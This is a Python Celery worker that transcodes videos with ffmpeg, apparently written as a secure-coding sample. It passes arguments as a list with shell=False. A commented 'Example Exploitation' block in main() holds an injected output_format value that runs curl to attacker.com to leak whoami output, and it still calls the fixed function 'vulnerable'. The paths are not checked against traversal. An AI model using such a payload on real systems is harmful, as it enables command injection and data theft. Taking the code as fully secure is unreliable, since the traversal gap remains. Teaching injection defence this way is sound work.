import os
import sqlite3
import subprocess
import logging
from celery import Celery

# Configure logging for the Distributed Worker Node
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - VideoWorker - %(levelname)s - %(message)s'
)
logger = logging.getLogger("MediaTranscoder")

# Initialize Celery app targeting a Redis broker
app = Celery(
    'media_tasks', 
    broker='redis://localhost:6379/0', 
    backend='redis://localhost:6379/0'
)

DB_FILE = "worker_state.db"

def initialize_worker_db():
    """Initializes local SQLite database to track encoding jobs on this node."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE encoding_jobs (
            job_id TEXT PRIMARY KEY,
            status TEXT NOT NULL,
            input_file TEXT NOT NULL,
            target_format TEXT NOT NULL,
            error_log TEXT
        )
    ''')
    
    # Insert mock queued jobs
    mock_jobs = [
        ('job-req-001', 'PENDING', 'marketing_promo.mov', 'mp4', ''),
        ('job-req-002', 'PENDING', 'training_v2.avi', 'webm', ''),
    ]
    cursor.executemany('''
        INSERT INTO encoding_jobs (job_id, status, input_file, target_format, error_log)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_jobs)
    
    conn.commit()
    conn.close()
    logger.info("Worker state database initialized.")

def update_job_status(job_id: str, status: str, error: str = ""):
    """Updates the job tracking table."""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(
        "UPDATE encoding_jobs SET status = ?, error_log = ? WHERE job_id = ?",
        (status, error, job_id)
    )
    conn.commit()
    conn.close()

@app.task(name="transcode_video_task")
def transcode_video_task(job_id: str, input_file: str, output_format: str):
    """
    SECURE: Uses an argument list and shell=False to prevent Command Injection.
    """
    logger.info(f"Starting secure job {job_id}: converting {input_file} to {output_format}")
    update_job_status(job_id, "PROCESSING")
    
    # Secure: Command and arguments are passed as a list.
    # subprocess.run with shell=False (the default) treats these strictly as arguments to the executable,
    # neutralizing any injected shell operators (like ;, &&, or |).
    command_args = [
        "ffmpeg",
        "-i", f"/var/media/in/{input_file}",
        "-vcodec", "copy",
        "-acodec", "copy",
        f"/var/media/out/{job_id}.{output_format}"
    ]
    
    try:
        logger.debug(f"Executing secure system command: {command_args}")
        
        process = subprocess.run(
            command_args, 
            shell=False, # Explicitly disabled for security
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            timeout=30,
            text=True
        )
        
        if process.returncode == 0:
            logger.info(f"Job {job_id} completed successfully.")
            update_job_status(job_id, "COMPLETED")
            return {"status": "success", "job_id": job_id}
        else:
            logger.error(f"Job {job_id} failed with ffmpeg error.")
            # Generic error log to prevent leaking internal execution state to attackers
            update_job_status(job_id, "FAILED", "An error occurred during media transcoding.")
            return {"status": "error", "reason": "ffmpeg_failed"}
            
    except subprocess.TimeoutExpired as e:
        logger.error(f"Job {job_id} timed out.")
        update_job_status(job_id, "TIMEOUT", "Transcoding process timed out.")
        return {"status": "error", "reason": "timeout"}
    except Exception as e:
        logger.error(f"Unexpected system error for job {job_id}: {e}")
        update_job_status(job_id, "SYSTEM_ERROR", "Internal system error occurred.")
        return {"status": "error", "reason": "system_error"}
      
def main():
    """Worker node startup sequence."""
    initialize_worker_db()
    logger.info("Celery media transcoder node initialized.")
    logger.info("Run this worker with: celery -A media_tasks worker --loglevel=info")
    
    # Example Exploitation: 
    # An attacker discovering the API endpoint that queues this task might send a payload
    # which gets serialized into Redis and picked up by this vulnerable worker function:
    # 
    # transcode_video_task.delay(
    #     job_id="job-req-evil", 
    #     input_file="normal.mp4", 
    #     output_format="mp4 && curl http://attacker.com/leak?data=$(whoami)"
    # )

if __name__ == '__main__':
    main()
